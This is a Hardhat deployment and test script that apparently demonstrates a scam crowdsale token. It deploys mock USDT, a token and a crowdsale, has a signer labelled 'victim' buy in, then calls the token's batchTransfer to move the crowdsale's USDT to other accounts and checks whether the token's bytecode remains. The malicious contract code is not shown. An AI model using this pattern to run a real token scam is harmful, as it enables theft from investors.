const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");
const ethers = require("ethers");

async function main() {
  const provider = new ethers.providers.Web3Provider(network.provider)
  const Tether = await hre.ethers.getContractFactory("USDT");
  const Token = await hre.ethers.getContractFactory("MyToken");
  const Crowdsale = await hre.ethers.getContractFactory("Crowdsale");

  const [ALICE, BOB, CHARLIE, DAN, EDWARD] = await hre.ethers.getSigners();

  const usdt = await Tether.deploy(BOB.address);
  await usdt.deployed();
  console.log("USDT deployed to:", usdt.address); // step 1 mock USDT

  console.log("ALICE USDT balance", await usdt.balanceOf(ALICE.address));
  console.log("BOB USDT balance", await usdt.balanceOf(BOB.address));

  const token = await Token.deploy();
  await token.deployed();
  console.log("Token deployed to:", token.address); // step 2 deploy my token
  await usdt.connect(ALICE).approve(token.address, ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));

  const crowdsale = await Crowdsale.deploy(token.address,usdt.address);
  await crowdsale.deployed();
  console.log("😈 Crowdsale deployed to:", crowdsale.address); // step 3 deploy Crowdsale

  await token.connect(ALICE).initialize(crowdsale.address);
  await crowdsale.connect(ALICE).unpause();
  await usdt.connect(BOB).approve(crowdsale.address, ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));
  console.log("😈 Crowdsale is contract bytecode exist",await provider.getCode(token.address) != "0x" ? true : false);
  // console.log("😈 Crowdsale contract bytecode",await provider.getCode(token.address)); // for retrieve full bytecode
  
  await crowdsale.connect(BOB).buy(parseEther("100")); // step 4 victim buy from Crowdsale
  console.log("😈 Crowdsale USDT balance", await usdt.balanceOf(crowdsale.address));

  await token.connect(ALICE).batchTransfer([usdt.address,CHARLIE.address, DAN.address, EDWARD.address,crowdsale.address],[1,1,1,1,1]);
  // await crowdsale.connect(ALICE).withdraw(); // for withdraw();

  console.log("CHARLIE USDT balance", (await usdt.balanceOf(CHARLIE.address)));
  console.log("DAN USDT balance", await usdt.balanceOf(DAN.address));
  console.log("EDWARD USDT balance", await usdt.balanceOf(EDWARD.address));
  console.log("😈 Crowdsale USDT balance", await usdt.balanceOf(crowdsale.address));
  console.log("😈 Crowdsale is contract bytecode exist",await provider.getCode(token.address) != "0x" ? true : false);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
